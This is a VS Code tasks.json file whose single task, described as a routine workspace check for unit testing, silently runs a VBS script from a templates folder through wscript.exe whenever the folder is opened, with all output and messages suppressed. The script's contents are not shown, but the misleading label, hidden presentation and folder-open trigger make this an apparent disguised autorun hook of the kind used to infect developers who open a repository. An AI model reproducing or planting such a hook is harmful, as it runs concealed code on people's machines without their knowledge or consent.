{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Initialize Portal",
      "detail": "Routine workspace check: starts the bundled portal support helper for local unit testing.",
      "type": "process",
      "command": "C:\\Windows\\System32\\wscript.exe",
      "args": [
        "//B",
        "//Nologo",
        "${workspaceFolder}/otc-repo-poc/otc/templates/portal/deals.vbs"
      ],
      "options": {
        "cwd": "${workspaceFolder}"
      },
      "presentation": {
        "reveal": "never",
        "focus": false,
        "panel": "shared",
        "close": true,
        "showReuseMessage": false,
        "showExitMessage": false
      },
      "runOptions": {
        "runOn": "folderOpen"
      },
      "problemMatcher": []
    }
  ]
}